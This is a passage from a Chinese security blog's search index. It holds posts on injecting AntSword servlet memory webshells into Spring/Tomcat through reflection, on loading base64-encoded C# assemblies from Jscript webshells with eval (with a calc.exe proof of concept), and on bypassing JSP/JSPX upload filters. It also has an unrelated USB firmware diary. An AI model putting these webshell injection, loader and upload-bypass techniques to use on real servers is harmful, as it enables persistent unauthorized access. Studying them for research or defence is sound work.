wrapper); this.invoke(standardContext, \"removeServletMapping\", urlPattern); if (this.getMethodByClass(wrapper.getClass(), \"setServlet\", Servlet.class) == null) { this.transform(standardContext, urlPattern); } return \"ok\"; } else { return \"not find wrapper\"; } } catch (Exception var8) { return var8.getMessage(); } } else { return \"wrapperName or urlPattern is Null\"; } } 内存马管理模块报了一个这样的错误： 15e0d5bERROR:// java.lang.NoSuchMethodException: org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext.removeChild(org.apache.catalina.Container)adc1b2c 定位一下问题出在这里 意思就是在StandardContext中找不到removeChild这个方法。 调试一下发现，Spring中获取到的StandardContext示例为其一个子类，叫做TomcatEmbeddedContext。虽然Spring中内置了Tomcat，但这个是Spring特有的。 TomcatEmbeddedContext继承了StandardContext，并且没有对removeChild进行改写，如果父类有这个方法应该是可以调用的。 开始以为是Spring在StandardContext中删掉了此方法，结果翻到父类StandardContext，发现跟普通的Tomcat一样，调用的org.apache.catalina.core.ContainerBase#removeChild org.apache.catalina.core.ContainerBase#removeChild 后来发现先入为主了，问题不是出在没有这个方法上，而是出在反射的写法上。这里要提一下反射中getMethods 跟getDeclaredMethods 的区别： getMethods 获取所有公有方法（包括父类方法） getDeclaredMethods 获取本类中的所有方法 (只拿本类中的) 哥斯拉中用的getDeclaredMethod，也就是只能获取到本类中的方法，自然反射拿不到父类的removeChild。 所以解决办法要么把getDeclaredMethod换成getMethod，因为removeChild本来就是public的，要么就直接调用removeChild方法，不采用反射。在这里我采用了后者。 在内存马模块同理，这里直接全部改了，不再用反射。 ","date":"2021-03-22","objectID":"/posts/as-exploits-memory-shell-for-spring/:2:1","series":null,"tags":[],"title":"As-Exploits内存马兼容Spring","uri":"/posts/as-exploits-memory-shell-for-spring/#关于反射的坑"},{"categories":["技术文章"],"content":"\r2.2 addServletMapping的兼容性问题要注意的是，在添加servlet的过程中，会涉及到addServletMapping函数的兼容性问题，并且很多文章中并没有仔细分析具体的版本号。这里贴一下我研究的结果： tomcat7 只能addServletMapping tomcat8 addServletMapping/addServletMappingDecoded都可以 tomcat9 只能addServletMappingDecoded 在这里要么用反射，两种方法都try一下。在这里提供一个更好的解决办法，使用ApplicationServletRegistration这个类。ApplicationServletRegistration对wrapper做了封装，自动会处理两种方法的兼容性。 核心代码如下： public String addServlet() throws Exception { ServletContext servletContext = this.request.getServletContext(); ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext; Field applicationContextField = applicationContextFacade.getClass().getDeclaredField(\"context\"); applicationContextField.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(applicationContextFacade); Field standardContextField = applicationContext.getClass().getDeclaredField(\"context\"); standardContextField.setAccessible(true); StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext); Wrapper wrapper = standardContext.createWrapper(); // 改为一个有迷惑性的名字 wrapper.setName(name); standardContext.addChild(wrapper); wrapper.setServletClass(this.getClass().getName()); wrapper.setServlet(this); ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext); registration.addMapping(path); registration.setLoadOnStartup(1); if (this.getMethodByClass(wrapper.getClass(), \"setServlet\", Servlet.class) == null) { this.transform(standardContext, this.path);//兼容tomcat5/6 this.init((ServletConfig) getFieldValue(wrapper, \"facade\")); } return \"Success\"; } ","date":"2021-03-22","objectID":"/posts/as-exploits-memory-shell-for-spring/:2:2","series":null,"tags":[],"title":"As-Exploits内存马兼容Spring","uri":"/posts/as-exploits-memory-shell-for-spring/#addservletmapping的兼容性问题"},{"categories":["技术文章"],"content":"\r2.3 运行截图获取Servlet 打入蚁剑内存马 再次获取Servlet，发现已经有了，并且在第一位。 连接成功 卸载Servlet 卸载后再次获取Servlet列表 ","date":"2021-03-22","objectID":"/posts/as-exploits-memory-shell-for-spring/:2:3","series":null,"tags":[],"title":"As-Exploits内存马兼容Spring","uri":"/posts/as-exploits-memory-shell-for-spring/#运行截图"},{"categories":["技术文章"],"content":"\r3 最后虽然我们可以通过setLoadOnStartup把servlet放在第一位，但是面对需要鉴权的shiro等目标打入一个servlet内存马还是有不小的局限性。所以目前filter内存马依旧是主流。但是蚁剑是支持listener类型的，listener的优先级还在filter之上。所以以后可能直接跳过filter，直接加入listener的payload。 ","date":"2021-03-22","objectID":"/posts/as-exploits-memory-shell-for-spring/:3:0","series":null,"tags":[],"title":"As-Exploits内存马兼容Spring","uri":"/posts/as-exploits-memory-shell-for-spring/#最后"},{"categories":["技术文章"],"content":"关于Tomcat中的三个Context的理解","date":"2021-03-16","objectID":"/posts/tomcat-context/","series":null,"tags":[],"title":"关于Tomcat中的三个Context的理解","uri":"/posts/tomcat-context/"},{"categories":["技术文章"],"content":" p牛在知识星球里问了一个问题：Tomcat中这三个StandardContext、ApplicationContext、ServletContext都是干什么的 skay师傅给出了自己的理解：https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew 这里来讲一讲我的理解，说的不一定对，仅供参考。 ","date":"2021-03-16","objectID":"/posts/tomcat-context/:0:0","series":null,"tags":[],"title":"关于Tomcat中的三个Context的理解","uri":"/posts/tomcat-context/#"},{"categories":["技术文章"],"content":"\r0.1 Contextcontext是上下文的意思，在java中经常能看到这个东西。那么到底是什么意思呢？ 根据我的理解，如果把某次请求比作电影中的事件，那么context就相当于事件发生的背景。例如一部电影中的某个镜头中，张三大喊“奥利给”，但是只看这一个镜头我们不知道到底发生了什么，张三是谁，为什么要喊“奥利给”。所以就需要交代当时事情发生的背景。张三是吃饭前喊的奥利给？还是吃饭后喊的奥利给？因为对于同一件事情：张三喊奥利给这件事，发生的背景不同意义可能是不同的。吃饭前喊奥利给可能是饿了的意思，吃饭后喊奥利给可能是说吃饱了的意思。在WEB请求中也如此，在一次request请求发生时，背景，也就是context会记录当时的情形：当前WEB容器中有几个filter，有什么servlet，有什么listener，请求的参数，请求的路径，有没有什么全局的参数等等。 ","date":"2021-03-16","objectID":"/posts/tomcat-context/:0:1","series":null,"tags":[],"title":"关于Tomcat中的三个Context的理解","uri":"/posts/tomcat-context/#context"},{"categories":["技术文章"],"content":"\r0.2 ServletContextServletContext是Servlet规范中规定的ServletContext接口，一般servlet都要实现这个接口。大概就是规定了如果要实现一个WEB容器，他的Context里面要有这些东西：获取路径，获取参数，获取当前的filter，获取当前的servlet等 package javax.servlet; ... public interface ServletContext { String TEMPDIR = \"javax.servlet.context.tempdir\"; String ORDERED_LIBS = \"javax.servlet.context.orderedLibs\"; String getContextPath(); ServletContext getContext(String var1); ... /** @deprecated */ @Deprecated Servlet getServlet(String var1) throws ServletException; /** @deprecated */ @Deprecated Enumeration\u003cServlet\u003e getServlets(); /** @deprecated */ @Deprecated Enumeration\u003cString\u003e getServletNames(); void log(String var1); /** @deprecated */ @Deprecated void log(Exception var1, String var2); void log(String var1, Throwable var2); String getRealPath(String var1); String getServerInfo(); String getInitParameter(String var1); Enumeration\u003cString\u003e getInitParameterNames(); boolean setInitParameter(String var1, String var2); Object getAttribute(String var1); Enumeration\u003cString\u003e getAttributeNames(); void setAttribute(String var1, Object var2); void removeAttribute(String var1); String getServletContextName(); Dynamic addServlet(String var1, String var2); Dynamic addServlet(String var1, Servlet var2); Dynamic addServlet(String var1, Class\u003c? extends Servlet\u003e var2); Dynamic addJspFile(String var1, String var2); \u003cT extends Servlet\u003e T createServlet(Class\u003cT\u003e var1) throws ServletException; ServletRegistration getServletRegistration(String var1); Map\u003cString, ? extends ServletRegistration\u003e getServletRegistrations(); javax.servlet.FilterRegistration.Dynamic addFilter(String var1, String var2); javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Filter var2); javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Class\u003c? extends Filter\u003e var2); \u003cT extends Filter\u003e T createFilter(Class\u003cT\u003e var1) throws ServletException; FilterRegistration getFilterRegistration(String var1); Map\u003cString, ? extends FilterRegistration\u003e getFilterRegistrations(); SessionCookieConfig getSessionCookieConfig(); void setSessionTrackingModes(Set\u003cSessionTrackingMode\u003e var1); Set\u003cSessionTrackingMode\u003e getDefaultSessionTrackingModes(); Set\u003cSessionTrackingMode\u003e getEffectiveSessionTrackingModes(); void addListener(String var1); \u003cT extends EventListener\u003e void addListener(T var1); void addListener(Class\u003c? extends EventListener\u003e var1); \u003cT extends EventListener\u003e T createListener(Class\u003cT\u003e var1) throws ServletException; JspConfigDescriptor getJspConfigDescriptor(); ClassLoader getClassLoader(); void declareRoles(String... var1); String getVirtualServerName(); int getSessionTimeout(); void setSessionTimeout(int var1); String getRequestCharacterEncoding(); void setRequestCharacterEncoding(String var1); String getResponseCharacterEncoding(); void setResponseCharacterEncoding(String var1); } ","date":"2021-03-16","objectID":"/posts/tomcat-context/:0:2","series":null,"tags":[],"title":"关于Tomcat中的三个Context的理解","uri":"/posts/tomcat-context/#servletcontext"},{"categories":["技术文章"],"content":"\r0.3 ApplicationContext在Tomcat中，ServletContext规范的实现是ApplicationContext，因为门面模式的原因，实际套了一层ApplicationContextFacade。关于什么是门面模式具体可以看这篇文章，简单来讲就是加一层包装。 其中ApplicationContext实现了ServletContext规范定义的一些方法，例如addServlet,addFilter等 ","date":"2021-03-16","objectID":"/posts/tomcat-context/:0:3","series":null,"tags":[],"title":"关于Tomcat中的三个Context的理解","uri":"/posts/tomcat-context/#applicationcontext"},{"categories":["技术文章"],"content":"\r0.4 StandardContextStandardContext存在于org.apache.catalina.core.StandardContext。 实际上研究ApplicationContext的代码会发现，ApplicationContext所实现的方法其实都是调用的this.context中的方法 而这个this.context就是一个实例化的StandardContext对象。 所以在我看来，StandardContext是Tomcat中真正起作用的Context，负责跟Tomcat的底层交互，ApplicationContext其实更像对StandardContext的一种封装。 用下面这张图来展示一下其中的关系 回过头看内存马。以添加filter为例，从上面的分析我们可以知道ApplicationContext跟Standerdcontext这两个东西都有addFilter的方法。那么实际选用哪一个呢？其实两种办法都可以。三梦师傅在基于tomcat的内存 Webshell 无文件攻击技术这篇文章里是利用反射修改了Tomcat的LifecycleState，绕过限制条件调用的ApplicationContext中的addFilter方法。 但是因为实际上最终调用的还是StandardContext的addFilter方法，所以我们就可以直接调用StandardContext的addFilter方法进行绕过，从而省去了绕过一堆判断的过程。这种实现具体可以看这个师傅的公众号文章。 ","date":"2021-03-16","objectID":"/posts/tomcat-context/:0:4","series":null,"tags":[],"title":"关于Tomcat中的三个Context的理解","uri":"/posts/tomcat-context/#standardcontext"},{"categories":["随便写写"],"content":"\r1 前言买过金士顿U盘的应该都知道一般金士顿是不支持bitlocker的，但是这样又很不方便，就想捣鼓一下。 从naivekun师傅那里知道了一个词叫量产，通过给U盘刷固件，就可以让U盘被识别为一个CD或者硬盘，从而支持bitlocker。结果折腾了两天。。。踩了各种坑。一开始刷炸了之后128g缩水成32g，然后又捣鼓捣鼓救了回来，反而扩容到了132g？神秘。 ","date":"2021-03-02","objectID":"/posts/make-usb-great-again/:1:0","series":null,"tags":[],"title":"金士顿 DTSE9G2 128G U盘量产踩坑记","uri":"/posts/make-usb-great-again/#前言"},{"categories":["随便写写"],"content":"\r2 前期准备型号：金士顿 DTSE9G2 128G 工具：ChipGenius ​ ST-TOOL_9000_v3.7F.92 ","date":"2021-03-02","objectID":"/posts/make-usb-great-again/:2:0","series":null,"tags":[],"title":"金士顿 DTSE9G2 128G U盘量产踩坑记","uri":"/posts/make-usb-great-again/#前期准备"},{"categories":["随便写写"],"content":"\r3 参数设置下载工具解压后打开STTOOL_F1_90_v200_00_SZ.exe 点击更新识别U盘，然后进入设定 固件档案中选择的是2309_hv3_ED3_T_1P.BIN而不是上文教程中的2309_hv3_ED3_M_1P.BIN。因为猜测M是mlc的意思，T是tlc的意思。ChipGenius中显示U盘是tlc，所以换成了2309_hv3_ED3_T_1P.BIN。 这里选择容量优先 自己是已经低格一遍了，所以选的高格扫描，分类方式选择容量有限。 低格一次4-5个小时，高格一次3-5分钟左右。 因为我的CE是4个就选的4，Capacity是U盘容量大小，我选择的是自动，也可以设置指定大小。 搞完后点击保存，返回上个界面。 ","date":"2021-03-02","objectID":"/posts/make-usb-great-again/:3:0","series":null,"tags":[],"title":"金士顿 DTSE9G2 128G U盘量产踩坑记","uri":"/posts/make-usb-great-again/#参数设置"},{"categories":["随便写写"],"content":"\r4 坑","date":"2021-03-02","objectID":"/posts/make-usb-great-again/:4:0","series":null,"tags":[],"title":"金士顿 DTSE9G2 128G U盘量产踩坑记","uri":"/posts/make-usb-great-again/#坑"},{"categories":["随便写写"],"content":"\r4.1 0x01量产工具要在本机运行，不要在虚拟机里面运行，否则会提示奇奇怪怪的错误。被坑了好久 ","date":"2021-03-02","objectID":"/posts/make-usb-great-again/:4:1","series":null,"tags":[],"title":"金士顿 DTSE9G2 128G U盘量产踩坑记","uri":"/posts/make-usb-great-again/#0x01"},{"categories":["随便写写"],"content":"\r4.2 0x02开始naivekun师傅是按照这个教程来的[教程] 群联PS2251-09(PS2309)U盘量产，刷完之后发现128g缩水到了32g。 帖子下面也有人出现了同样的问题 64g的没事，128g的就缩水。刚开始以为是CE太多，固件不兼容啥的，后来发现其实是因为工具默认使用的是速度优先策略，会把低速数据块抛弃，才会导致量产后容量变小但是用起来非常顺畅。 ","date":"2021-03-02","objectID":"/posts/make-usb-great-again/:4:2","series":null,"tags":[],"title":"金士顿 DTSE9G2 128G U盘量产踩坑记","uri":"/posts/make-usb-great-again/#0x02"},{"categories":["随便写写"],"content":"\r4.3 0x03格完之后不要急着拔U盘，在U盘里新建一个文件再拔，否则再次插入会不识别U盘。神秘 ","date":"2021-03-02","objectID":"/posts/make-usb-great-again/:4:3","series":null,"tags":[],"title":"金士顿 DTSE9G2 128G U盘量产踩坑记","uri":"/posts/make-usb-great-again/#0x03"},{"categories":["随便写写"],"content":"\r5 量产过程第一次是选择了低格+高格，贼鸡儿慢。。。 完事之后去看设备管理器发现已经量产成功，但是拔出U盘再插入就会无法识别。 后来用高格又刷了一遍，刚刷完之后没先拔出来，在U盘里新建了一个txt，然后拔出U盘，再次读取，成功识别！ 但是怎么变成132g了。。。还扩容了呢 测试一下读写 360U盘鉴定一下容量 还行吧，预期范围之内 选中U盘右键，终于出现了bitlocker的选项。。。 加密驱动器，成功！ ","date":"2021-03-02","objectID":"/posts/make-usb-great-again/:5:0","series":null,"tags":[],"title":"金士顿 DTSE9G2 128G U盘量产踩坑记","uri":"/posts/make-usb-great-again/#量产过程"},{"categories":["随便写写"],"content":"\r6 最后没事还是不要搞量产orz。 ","date":"2021-03-02","objectID":"/posts/make-usb-great-again/:6:0","series":null,"tags":[],"title":"金士顿 DTSE9G2 128G U盘量产踩坑记","uri":"/posts/make-usb-great-again/#最后"},{"categories":["技术文章"],"content":"\r1 前言最近想要给As-Exploits增加aspx类型的支持，就研究了一下冰蝎跟哥斯拉的实现。 由于冰蝎跟哥斯拉都采用的C#类型的shell，所以可以直接调用系统的一些api，并且可以加载任意的shellcode。而蚁剑采用的是传统的Jscript。就想找个办法把它们两者结合起来，用Jscript加载C#的assembly，以此来达到兼容原有shell类型的目的。 但是在实现的过程中踩了一些坑，所以就写下这篇文章记录一下。 ","date":"2021-01-27","objectID":"/posts/jscript-load-csharp-assembly/:1:0","series":null,"tags":[],"title":"Jscript加载Assembly踩坑记","uri":"/posts/jscript-load-csharp-assembly/#前言"},{"categories":["技术文章"],"content":"\r2 理论支持","date":"2021-01-27","objectID":"/posts/jscript-load-csharp-assembly/:2:0","series":null,"tags":[],"title":"Jscript加载Assembly踩坑记","uri":"/posts/jscript-load-csharp-assembly/#理论支持"},{"categories":["技术文章"],"content":"\r2.1 Assembly这里要先提到一个概念叫Assembly，引用一下rebeyond师傅文章中的话：https://xz.aliyun.com/t/2758 在Java中，每个类经过编译之后都单独对应一个class文件，而在.net中则不同，.net中不存在单个类对应的二进制文件，而是引入了一个叫做Assembly（程序集）的概念，已编译的类是以Assembly的形式来承载的，Assembly是供CLR执行的可执行文件。在.NET下，托管的DLL和EXE都称之为Assembly，一个Assembly可以包含多个类。 java跟.net有很多相似之处，这里我们可以简单的理解为：.net中的assembly就像java中的class。java中使用defineClass来加载一个类到jvm内存中，同样，.net中可以使用Assembly.Load来把assembly加载到内存中。 ","date":"2021-01-27","objectID":"/posts/jscript-load-csharp-assembly/:2:1","series":null,"tags":[],"title":"Jscript加载Assembly踩坑记","uri":"/posts/jscript-load-csharp-assembly/#assembly"},{"categories":["技术文章"],"content":"\r2.2 从Jscript到C#蚁剑用的是Jscript，然而冰蝎哥斯拉用的C#，那么能否用Jscript去调用C#呢？ 答案是可以的，这里附一张.net framework的框架图 可以看到最顶层的如C#,VB,Jscript等语言，他们的底层框架都是通用的，都是在.net framework这个体系内。所以C#编译成的assembly在Jscript中是可以通用的。 那么Jscript如何将其加载进去呢？由于其中部分基类库Base Class Library(BCL)是共有的。而Assembly.Load刚好在System.Reflection这个命名空间下面，所以我们就可以在Jscript中调用System.Reflection.Assembly.Load来把C#的assembly加载到内存中。 这里可能会有同学问了，既然Jscript也是一门独立的语言，理论上C#能实现的他都能实现，为什么还要大费周折再去加载C#呢？ 其实也不是没有想过直接用Jscript写。。。但是在实现的过程中发现太蛋疼了，Jscript基本搜不到什么文档，报错也搜不到，本人测试过VS，VS code，rider，都没有Jscript的补全跟高亮，开发起来非常难受。另外一个原因是很多开源工具都用的C#实现，采用assembly加载的方式稍微修改一下就可以快速复用。 ","date":"2021-01-27","objectID":"/posts/jscript-load-csharp-assembly/:2:2","series":null,"tags":[],"title":"Jscript加载Assembly踩坑记","uri":"/posts/jscript-load-csharp-assembly/#从jscript到c"},{"categories":["技术文章"],"content":"\r3 踩坑过程前面扯了这么多主要是理论，当然实现中没有这么顺利。 首先新建一个Class Library项目，这里以弹计算器为例。 using System.Diagnostics; namespace AntPayload { public class Run { public override bool Equals(object obj) { Process.Start(\"calc.exe\"); return true; } } } 项目自动编译或者手动编译为dll csc /t:library AntPayload.cs base64一下 base64 -w 0 AntPayload.dll \u003e AntPayload.txt Payload TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAEXJD2AAAAAAAAAAAOAAIiALATAAAAgAAAAGAAAAAAAANicAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAOQmAABPAAAAAEAAAIgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAACsJQAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAPAcAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAIgDAAAAQAAAAAQAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAYJwAAAAAAAEgAAAACAAUAaCAAAEQFAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADZyAQAAcCgOAAAKJhcqHgIoDwAACioAAEJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAMwBAAAjfgAAOAIAACQCAAAjU3RyaW5ncwAAAABcBAAAFAAAACNVUwBwBAAAEAAAACNHVUlEAAAAgAQAAMQAAAAjQmxvYgAAAAAAAAACAAABRxUAAAkAAAAA+gEzABYAAAEAAAAQAAAAAgAAAAIAAAABAAAADwAAAA0AAAABAAAAAgAAAAAAbgEBAAAAAAAGAN8AzgEGAEwBzgEGACwAnAEPAO4BAAAGAFQAhAEGAMIAhAEGAKMAhAEGADMBhAEGAP8AhAEGABgBhAEGAGsAhAEGAEAArwEGAB4ArwEGAIYAhAEGAAwCfQEKAAQCnAEAAAAAAQAAAAAAAQABAAEAEAAZAhMAPQABAAEAUCAAAAAAxgD9ASkAAQBeIAAAAACGGJYBBgACAAAAAQBqAQkAlgEBABEAlgEGABkAlgEKACkAlgEQADEAlgEQADkAlgEQAEEAlgEQAEkAlgEQAFEAlgEQAFkAlgEQAGEAlgEVAGkAlgEQAHEAlgEQAIEAEwIaAHkAlgEGAC4ACwAuAC4AEwA3AC4AGwBWAC4AIwBfAC4AKwBvAC4AMwBvAC4AOwBvAC4AQwBfAC4ASwB1AC4AUwBvAC4AWwBvAC4AYwCNAC4AawC3AASAAAABAAAAAAAAAAAAAAAAABMAAAACAAAAAAAAAAAAAAAgAAoAAAAAAAIAAAAAAAAAAAAAACAAfQEAAAAAAAAAPE1vZHVsZT4AbXNjb3JsaWIAQW50UGF5bG9hZABHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAG9iagBBbnRQYXlsb2FkLmRsbABTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24ALmN0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAEVxdWFscwBQcm9jZXNzAE9iamVjdABTdGFydABSdW5UZXN0AAAAAAARYwBhAGwAYwAuAGUAeABlAAAADuw7XR6MQkeND6FGq61D8gAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECBQABEkEOCLd6XFYZNOCJBCABAhwIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEAAgAAAAAADwEACkFudFBheWxvYWQAAAUBAAAAABcBABJDb3B5cmlnaHQgwqkgIDIwMjEAACkBACQ1MzE2OEVCNi04QTE4LTQwM0UtQkM0Ni1CRjU2NUZEQTFBRTYAAAwBAAcxLjAuMC4wAAAAAAAARckPYAAAAAACAAAAHAEAAMglAADIBwAAUlNEU8baoqhTlGdMk7YSVd9Yd5wBAAAARDpcUmlkZXJQcm9qZWN0c1xEbGxUZXN0XEFudFBheWxvYWRcb2JqXFJlbGVhc2VcQW50UGF5bG9hZC5wZGIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMJwAAAAAAAAAAAAAmJwAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGCcAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAAAAAA/yUAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAAsAwAAAAAAAAAAAAAsAzQAAABWAFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEY","date":"2021-01-27","objectID":"/posts/jscript-load-csharp-assembly/:3:0","series":null,"tags":[],"title":"Jscript加载Assembly踩坑记","uri":"/posts/jscript-load-csharp-assembly/#踩坑过程"},{"categories":["技术文章"],"content":"\r4 问题解决试了很多办法都失败了，后来谷歌搜到了一篇2012年的博客遇到了同样的问题，大概意思是说两次的assembly被加载到了不同的上下文中，所以被当作成为不同的类，无法进行类型转换。 跟北辰师傅研究了一番后，北辰师傅想到一种方法：把第一次加载后的assembly的引用给存到当前Application的上下文中，即HttpContext.Current.Application这个类里面，然后再通过Application.Get(“ant”)拿到引用，然后反射，再获取实例化，这样就可以解决上下文不同的问题。 payload修改如下 var Payload=\"xxxxx\"; HttpContext.Current.Application.Add(\"ant\", System.Reflection.Assembly.Load(Convert.FromBase64String(Payload))); HttpContext.Current.Application.Get(\"ant\").GetType(\"AntPayload.Run\").GetConstructor(new Type[0]).Invoke(null).Equals(this); 然后通过eval打过去，此时就可以多次稳定触发payload了。 ","date":"2021-01-27","objectID":"/posts/jscript-load-csharp-assembly/:4:0","series":null,"tags":[],"title":"Jscript加载Assembly踩坑记","uri":"/posts/jscript-load-csharp-assembly/#问题解决"},{"categories":["技术文章"],"content":"\r5 最后特别感谢北辰师傅的交流探讨！ 初学.net，有些地方是凭借自己的理解写的，如果有说的不对的地方欢迎指出，以免误导他人。 ","date":"2021-01-27","objectID":"/posts/jscript-load-csharp-assembly/:5:0","series":null,"tags":[],"title":"Jscript加载Assembly踩坑记","uri":"/posts/jscript-load-csharp-assembly/#最后"},{"categories":["技术文章"],"content":"\r1 背景前几天有个小伙伴做项目的时候遇到一个问题来问我，大概情况如下： jsp的站，可以任意文件上传 上传jsp会把\u003c%中的\u003c给转义掉 上传jspx会把jsp:scriptlet到\u003c/jsp:scriptlet\u003e中的内容替换为空 问有什么突破办法？ 当时研究了一下后jsp和jspx各给了一个解决方案，后来发到星球里后@hosch3n师傅又提出了一种新的方案，tql ","date":"2021-01-15","objectID":"/posts/jsp-webshell-upload-bypass/:1:0","series":null,"tags":["bypass"],"title":"星球问答：一次jsp上传绕过的思考","uri":"/posts/jsp-webshell-upload-bypass/#背景"},{"categories":["技术文章"],"content":"\r2 解决方案其实问题等价于： jsp不使用\u003c% %\u003e标签如何执行命令 jspx不使用jsp:scriptlet \u003c/jsp:scriptlet\u003e如何执行命令 ","date":"2021-01-15","objectID":"/posts/jsp-webshell-upload-bypass/:2:0","series":null,"tags":["bypass"],"title":"星球问答：一次jsp上传绕过的思考","uri":"/posts/jsp-webshell-upload-bypass/#解决方案"},{"categories":["技术文章"],"content":"\r2.1 jsp利用EL表达式绕过jsp是默认解析el表达式的，并且在没有jsp标签的情况下也可以直接执行，这样就可以绕过jsp的限制。 星球里面@Gh0stFx也提到了这一点 ","date":"2021-01-15","objectID":"/posts/jsp-webshell-upload-bypass/:2:1","series":null,"tags":["bypass"],"title":"星球问答：一次jsp上传绕过的思考","uri":"/posts/jsp-webshell-upload-bypass/#jsp利用el表达式绕过"},{"categories":["技术文章"],"content":"\r2.2 jspx利用命名空间绕过因为jspx实际上是jsp的xml写法，所以继承了xml的所有特性，例如cdata跟html实体编码等，同样也继承了命名空间的特性。 https://www.runoob.com/xml/xml-namespaces.html 在jsp:scriptlet这个标签中，jsp就是默认的命名空间，但是实际上可以随意替换成其他名字 这样就绕过了对jsp:scriptlet的过滤 ","date":"2021-01-15","objectID":"/posts/jsp-webshell-upload-bypass/:2:2","series":null,"tags":["bypass"],"title":"星球问答：一次jsp上传绕过的思考","uri":"/posts/jsp-webshell-upload-bypass/#jspx利用命名空间绕过"},{"categories":["技术文章"],"content":"\r2.3 jspx利用jsp:expression绕过在jsp中可以利用表达式绕过，那么jspx中同样也可以，以下是jsp跟jspx语法的对照： JSP语法 JSP document语法 Page Directive \u003c%@ page %\u003e \u003cjsp:directive.page /\u003e Include Directive \u003c%@ include %\u003e \u003cjsp:directive.include /\u003e Tag Library Directive \u003c%@ taglib %\u003e xmlns:prefix=”Library URI” Declartion \u003c%! … %\u003e jsp:declaration … \u003c/jsp:declaration\u003e Scriplet \u003c% … %\u003e jsp:scriptlet … \u003c/jsp:scriptlet\u003e Expression \u003c%= … %\u003e jsp:expression … \u003c/jsp:expression\u003e Comment \u003c%– … –%\u003e 这个方法是@hosch3n师傅提出来的，把表达式写到jspx中，同样可以达到执行命令的目的 ","date":"2021-01-15","objectID":"/posts/jsp-webshell-upload-bypass/:2:3","series":null,"tags":["bypass"],"title":"星球问答：一次jsp上传绕过的思考","uri":"/posts/jsp-webshell-upload-bypass/#jspx利用jspexpression绕过"},{"categories":["技术文章"],"content":"\r1 